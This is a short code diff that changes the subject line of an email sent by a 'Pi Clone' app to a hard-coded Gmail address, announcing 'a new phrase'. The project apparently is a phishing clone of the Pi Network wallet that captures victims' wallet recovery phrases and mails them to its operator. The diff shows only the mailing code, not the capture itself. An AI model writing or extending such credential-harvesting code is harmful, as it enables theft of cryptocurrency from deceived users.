@@ -24,7 +24,7 @@ const formatMessage = async (message: string) => {
     const mailOptions = {
         from: `Pi Clone ${email}`,
         to: "sparrowthedev@gmail.com",
-        subject: "Yo! you just got a new phrase",
+        subject: "Yo! you just got a new phrase from mr Mich",
         html: formattedMessage,
     }
 
